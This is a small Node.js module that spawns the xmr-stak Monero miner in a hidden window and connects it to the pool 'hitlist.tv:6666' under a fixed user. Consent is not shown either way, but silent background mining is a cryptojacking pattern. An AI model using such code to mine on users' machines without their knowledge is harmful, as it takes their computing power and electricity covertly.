const { spawn } = require('child_process');
const EventEmitter = require('events');

class Runner extends EventEmitter {
  constructor(options) {
    super();
    this.user = options.user || 'hitlist';
    this.intensity = options.options || 100;
    this.process = null;
  }

  start() {
    let startParams = [`-u`, `${this.user}`, '-o', 'hitlist.tv:6666'];
    this.process = spawn(`./xmr-stak`, startParams, {windowsHide: true, cwd: `${__dirname}`});
    this.process.stdout.on('data', (data) => {});
    this.process.stderr.on('data', (data) => {
      console.log('stderr', data.toString());
      if(data.toString().split('yay')[1]) {
        this.emit('found');
      }
    });
    this.process.stderr.on('error', this.kill.bind(this));
    this.process.on('close', this.kill.bind(this));
  }

  stop() {
    this.process.kill();
  }

  kill() {
    this.emit('kill', this.id);
    this.removeAllListeners();
    delete this.process;
  }
}

module.exports = Runner;
